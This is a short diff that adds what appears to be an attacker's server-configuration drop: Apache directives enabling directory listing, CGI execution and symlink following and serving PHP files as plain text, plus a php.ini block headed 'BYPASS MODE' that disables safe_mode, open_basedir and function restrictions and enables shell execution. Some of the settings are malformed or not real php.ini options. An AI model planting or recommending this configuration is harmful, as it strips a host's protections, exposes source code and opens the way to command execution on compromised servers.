@@ -1,0 +1,19 @@
+#TIPE FILE
+<DIRECTORY /..../user/..../>
+OPTIONS  Indexes ExecCGI FollowSymLinks
+AllowOverride All
+</DIRECTORY>
+AddType txt .php
+AddHandler txt .php
+ 
+ 
+"php.ini":
+ 
+#BYPASS MODE
+safe_mode = OFF
+disable_functions = NONE
+safe_mode_gid = OFF
+open_basedir = OFF
+register_globals = ON
+exec = ON
+shell_exec = ON
